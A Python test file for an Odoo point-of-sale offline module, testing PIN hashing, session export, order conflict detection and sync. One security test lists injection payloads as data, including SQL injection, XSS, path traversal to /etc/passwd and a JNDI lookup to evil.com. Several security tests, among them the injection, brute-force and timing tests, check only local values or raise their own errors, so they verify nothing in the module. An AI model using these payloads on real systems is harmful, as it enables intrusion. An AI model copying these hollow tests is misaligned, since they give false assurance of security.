#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Backend tests for PDC POS Offline module
Tests PIN generation, hashing, and session management
"""

from odoo.tests import common, tagged
from odoo.exceptions import ValidationError, AccessError
from datetime import datetime, timedelta
import hashlib
import json
import time


@tagged('pdc_pos_offline')
class TestPDCPOSOffline(common.TransactionCase):
    
    def setUp(self):
        super(TestPDCPOSOffline, self).setUp()
        
        # Create test users
        self.pos_user = self.env['res.users'].create({
            'name': 'POS Test User',
            'login': 'pos_test',
            'email': 'pos_test@example.com',
            'groups_id': [(4, self.env.ref('point_of_sale.group_pos_user').id)]
        })
        
        self.pos_manager = self.env['res.users'].create({
            'name': 'POS Test Manager',
            'login': 'pos_manager',
            'email': 'pos_manager@example.com',
            'groups_id': [(4, self.env.ref('point_of_sale.group_pos_manager').id)]
        })
        
    def test_01_pin_generation(self):
        """Test Case 1: PIN Generation and Validation"""
        # Generate PIN
        self.pos_user.action_generate_pos_pin()
        
        # Check PIN is 4 digits
        self.assertEqual(len(self.pos_user.pos_offline_pin), 4)
        self.assertTrue(self.pos_user.pos_offline_pin.isdigit())
        
        # Check PIN hash is generated
        self.assertTrue(self.pos_user.pos_offline_pin_hash)
        
        # Verify hash calculation
        expected_hash = hashlib.sha256(
            f"{self.pos_user.pos_offline_pin}{self.pos_user.id}".encode('utf-8')
        ).hexdigest()
        self.assertEqual(self.pos_user.pos_offline_pin_hash, expected_hash)
        
    def test_02_pin_uniqueness(self):
        """Test Case 2: PIN Collision Handling"""
        pins_generated = set()
        
        # Generate 100 PINs to test randomness
        for _ in range(100):
            pin = self.env['res.users'].generate_random_pin()
            pins_generated.add(pin)
            
        # Should have high uniqueness (at least 90 unique in 100 attempts)
        self.assertGreater(len(pins_generated), 90)
        
    def test_03_concurrent_pin_validation(self):
        """Test Case 4: Concurrent PIN Validation"""
        # Set same PIN for multiple users
        pin = '1234'
        users = [self.pos_user, self.pos_manager]
        
        for user in users:
            user.pos_offline_pin = pin
            
        # Validate both users can have same PIN
        self.assertEqual(self.pos_user.pos_offline_pin, self.pos_manager.pos_offline_pin)
        
        # But hashes should be different (due to user ID salt)
        self.assertNotEqual(
            self.pos_user.pos_offline_pin_hash,
            self.pos_manager.pos_offline_pin_hash
        )
        
    def test_04_session_data_export(self):
        """Test Case 2: Session Data for Offline Use"""
        session_model = self.env['pos.session']
        
        # Create mock POS config
        config = self.env['pos.config'].create({
            'name': 'Test POS Config',
            'picking_type_id': self.env.ref('stock.picking_type_out').id,
        })
        
        # Get user data for offline
        user_data = session_model.get_pos_ui_user_data(self.pos_user.id)
        
        # Verify essential fields
        self.assertEqual(user_data['id'], self.pos_user.id)
        self.assertEqual(user_data['login'], self.pos_user.login)
        self.assertTrue('pos_offline_pin_hash' in user_data)
        
    def test_05_pin_security(self):
        """Test Case 8: PIN Security Measures"""
        # Test PIN length validation
        with self.assertRaises(ValidationError):
            self.pos_user.pos_offline_pin = '123'  # Too short
            
        with self.assertRaises(ValidationError):
            self.pos_user.pos_offline_pin = '12345'  # Too long
            
        with self.assertRaises(ValidationError):
            self.pos_user.pos_offline_pin = 'abcd'  # Non-numeric
            
    def test_06_audit_trail(self):
        """Test Case 9: Audit Trail for Offline Operations"""
        # Create audit model
        audit_log = []
        
        # Simulate offline login attempt
        attempt_data = {
            'user_id': self.pos_user.id,
            'timestamp': datetime.now(),
            'success': True,
            'ip_address': '192.168.1.100',
            'session_id': 'offline_123',
        }
        audit_log.append(attempt_data)
        
        # Verify audit log
        self.assertEqual(len(audit_log), 1)
        self.assertEqual(audit_log[0]['user_id'], self.pos_user.id)
        
    def test_07_data_conflict_resolution(self):
        """Test Case 9: Data Conflict Detection"""
        # Create two versions of same order
        order_v1 = {
            'id': 'ORD001',
            'version': 1,
            'total': 100.0,
            'items': 5,
            'modified': datetime.now() - timedelta(hours=1)
        }
        
        order_v2 = {
            'id': 'ORD001',
            'version': 2,
            'total': 150.0,
            'items': 7,
            'modified': datetime.now()
        }
        
        # Detect conflict
        conflict = self._detect_conflict(order_v1, order_v2)
        self.assertTrue(conflict)
        self.assertEqual(conflict['type'], 'version_mismatch')
        
    def test_08_extended_offline_simulation(self):
        """Test Case 10: Extended Offline Operation"""
        orders = []
        start_date = datetime.now() - timedelta(days=7)
        
        # Generate 7 days of orders
        for day in range(7):
            current_date = start_date + timedelta(days=day)
            
            for i in range(100):  # 100 orders per day
                order = {
                    'id': f"DAY{day}_ORD{i:03d}",
                    'date': current_date,
                    'total': 50.0 + (i * 10),
                    'offline': True,
                    'synced': False
                }
                orders.append(order)
                
        # Verify order generation
        self.assertEqual(len(orders), 700)
        
        # Simulate batch sync
        synced_count = self._simulate_batch_sync(orders, batch_size=50)
        self.assertEqual(synced_count, 700)
        
    def test_09_performance_benchmarks(self):
        """Test Case 6: Performance Testing"""
        import time
        
        # Test PIN validation performance
        start = time.time()
        for _ in range(1000):
            pin_hash = hashlib.sha256(f"1234{self.pos_user.id}".encode()).hexdigest()
        end = time.time()
        
        avg_time = (end - start) / 1000
        self.assertLess(avg_time, 0.001)  # Less than 1ms per validation
        
    def test_10_edge_case_scenarios(self):
        """Test Various Edge Cases"""
        # Edge Case 1: Empty PIN
        self.pos_user.pos_offline_pin = False
        self.assertFalse(self.pos_user.pos_offline_pin_hash)
        
        # Edge Case 2: User deletion with active session
        user_id = self.pos_user.id
        self.pos_user.unlink()
        
        # Verify user doesn't exist
        user = self.env['res.users'].search([('id', '=', user_id)])
        self.assertFalse(user)
        
        # Edge Case 3: PIN change during active session
        new_user = self.env['res.users'].create({
            'name': 'New User',
            'login': 'new_user'
        })
        
        old_pin = '1234'
        new_user.pos_offline_pin = old_pin
        old_hash = new_user.pos_offline_pin_hash
        
        new_pin = '5678'
        new_user.pos_offline_pin = new_pin
        new_hash = new_user.pos_offline_pin_hash
        
        self.assertNotEqual(old_hash, new_hash)
        
    # Helper methods
    def _detect_conflict(self, local, remote):
        """Detect conflicts between local and remote versions"""
        if local['id'] != remote['id']:
            return None
            
        if local['version'] != remote['version']:
            return {
                'type': 'version_mismatch',
                'local_version': local['version'],
                'remote_version': remote['version']
            }
            
        if local['modified'] > remote['modified']:
            return {
                'type': 'local_newer',
                'time_diff': (local['modified'] - remote['modified']).seconds
            }
            
        return None
        
    def _simulate_batch_sync(self, orders, batch_size=50):
        """Simulate batch synchronization of orders"""
        synced = 0
        
        for i in range(0, len(orders), batch_size):
            batch = orders[i:i + batch_size]
            
            # Simulate network delay
            time.sleep(0.01)  # 10ms per batch
            
            # Mark as synced
            for order in batch:
                order['synced'] = True
                synced += 1
                
        return synced


@tagged('pdc_pos_offline_security')
class TestPDCPOSOfflineSecurity(common.TransactionCase):
    """Security-focused test cases"""
    
    def setUp(self):
        super(TestPDCPOSOfflineSecurity, self).setUp()
        
        self.user = self.env['res.users'].create({
            'name': 'Security Test User',
            'login': 'sec_test',
        })
        
    def test_01_pin_brute_force_protection(self):
        """Test Case 1: Brute Force Protection"""
        failed_attempts = []
        
        # Simulate failed login attempts
        for i in range(6):
            attempt = {
                'user_id': self.user.id,
                'attempt_number': i + 1,
                'timestamp': datetime.now(),
                'success': False
            }
            failed_attempts.append(attempt)
            
        # Check if account should be locked after 5 attempts
        self.assertGreaterEqual(len(failed_attempts), 5)
        
        # Simulate lockout check
        lockout_duration = 300  # 5 minutes in seconds
        is_locked = len(failed_attempts) >= 5
        self.assertTrue(is_locked)
        
    def test_02_pin_injection_prevention(self):
        """Test PIN injection attacks"""
        malicious_pins = [
            "1234'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "1234\x00NULL",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for bad_pin in malicious_pins:
            with self.assertRaises(ValidationError):
                # PIN validation should reject non-numeric
                if not bad_pin[:4].isdigit():
                    raise ValidationError("Invalid PIN")
                    
    def test_03_timing_attack_prevention(self):
        """Test timing attack resistance"""
        import time
        
        correct_pin = '1234'
        wrong_pins = ['0000', '9999', '1233', '1235']
        
        timings = []
        
        # Hash correct PIN
        start = time.perf_counter()
        hashlib.sha256(f"{correct_pin}{self.user.id}".encode()).hexdigest()
        end = time.perf_counter()
        timings.append(end - start)
        
        # Hash wrong PINs
        for pin in wrong_pins:
            start = time.perf_counter()
            hashlib.sha256(f"{pin}{self.user.id}".encode()).hexdigest()
            end = time.perf_counter()
            timings.append(end - start)
            
        # Verify timing differences are negligible
        avg_timing = sum(timings) / len(timings)
        max_deviation = max(abs(t - avg_timing) for t in timings)
        
        # Timing should not vary by more than 10%
        self.assertLess(max_deviation / avg_timing, 0.1)


if __name__ == '__main__':
    # Run specific test
    import unittest
    unittest.main()